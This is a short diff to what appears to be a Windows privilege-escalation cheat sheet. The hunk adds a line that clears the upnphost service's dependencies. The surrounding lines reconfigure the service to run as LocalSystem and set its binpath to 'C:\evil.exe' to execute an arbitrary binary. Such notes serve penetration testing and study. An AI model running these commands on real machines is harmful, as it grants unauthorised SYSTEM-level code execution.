@@ -634,6 +634,7 @@ dir C:\windows\system32 /Q | find "BOB" (find sys-files owned by BOB)
 sc qc upnphost
 sc stop upnphost
 sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
 ```
 #### Binary Execution method
 ```sc config upnphost binpath= “C:\evil.exe”```
